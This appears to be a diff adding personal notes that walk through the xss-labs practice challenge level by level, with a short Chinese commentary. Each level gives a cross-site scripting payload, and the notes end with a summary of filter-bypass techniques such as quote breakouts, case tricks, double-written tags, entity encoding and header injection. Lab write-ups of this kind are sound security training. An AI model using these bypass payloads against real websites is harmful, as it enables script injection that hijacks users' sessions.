@@ -1,0 +1,90 @@
+那些年我们一起学XSS https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html
+
+xss-labs
+
+level1
+
+    <script>alert(1)</script>
+
+level2
+
+    " onclick=javascript:alert('xss') //
+
+level3
+
+    ' onclick=javascript:alert('xss') //
+
+level4
+
+    " onclick=javascript:alert('xss') //
+
+level5
+
+    "> <a href=javascript:alert('xss') > xss</a> //
+
+level6
+
+    "> <a Href=javascript:alert('xss') > xss</a> //
+
+level7
+
+    "> <scscriptript>alert(1)</scscriptript>
+
+level8
+
+javascrip&#116;:alert('xss');
+
+level9
+
+    javascrip&#116;:alert('xss'); //http://
+
+level10
+
+    123&t_sort=" type="text" onclick="alert('xss')
+
+level11
+
+    Referer: " type="text" onclick="alert('xss')
+
+level12
+
+    User-Agent: " type="text" onclick="alert('xss')
+
+level13
+
+    Cookie: " type="text" onclick="alert('xss')
+
+level14 exif xss 
+
+    上传一个含有xss代码的图片触发xss
+
+level15 ng-include
+
+    ?src='level1.php?name=<img src=1 onerror=alert(1)>'
+
+level16
+
+    <img%0asrc=”111”%0aonerror=alert(‘xss’)>
+
+level17
+
+    ?arg01=a&arg02=b onmouseover=alert('xss')
+
+level18
+
+    ?arg01=a&arg02=b onmouseover=alert('xss')
+
+level19 flash xss
+
+    ?arg01=version&arg02=<a href="javascript:alert(/bmfx/)">bmfx</a> 
+    此关卡是跟flash xss有关，具体可参考：https://www.cnblogs.com/-qing-/p/10853379.html
+    针对flash的反编译工具：https://github.com/jindrapetrik/jpexs-decompiler  
+    具体的编译过程请查看：https://www.zhaosimeng.cn/writeup/119.html 和 http://0verflow.cn/?p=1811
+
+level20
+
+    ?arg01=id&arg02=bmfx\"))}catch(e){alert(/bmfx/)}//%26width=998%26height=998
+
+
+
+闭合、大小写、特定字符串过滤（<>'"\ href src onxxxx script）、双写 、编码...
